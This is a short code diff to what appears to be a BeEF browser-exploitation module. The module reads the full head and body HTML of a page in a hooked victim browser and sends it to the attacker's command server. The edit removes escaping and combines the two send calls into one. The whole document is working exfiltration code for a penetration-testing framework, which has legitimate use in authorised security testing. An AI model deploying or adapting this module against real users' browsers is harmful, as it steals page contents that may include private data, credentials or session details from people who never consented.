@@ -16,18 +16,17 @@
 beef.execute(function() {
 
 	try {
-		var html_head = escape(document.head.innerHTML.toString());
+		var html_head = document.head.innerHTML.toString();
 	} catch (e) {
 		var html_head = "Error: document has no head";
 	}
 	try {
-		var html_body = escape(document.body.innerHTML.toString());
+		var html_body = document.body.innerHTML.toString();
 	} catch (e) {
 		var html_body = "Error: document has no body";
 	}
 
-	beef.net.send("<%= @command_url %>", <%= @command_id %>, 'head='+html_head);
-	beef.net.send("<%= @command_url %>", <%= @command_id %>, 'body='+html_body);
+	beef.net.send("<%= @command_url %>", <%= @command_id %>, 'head='+html_head+'&body='+html_body);
 
 });
 
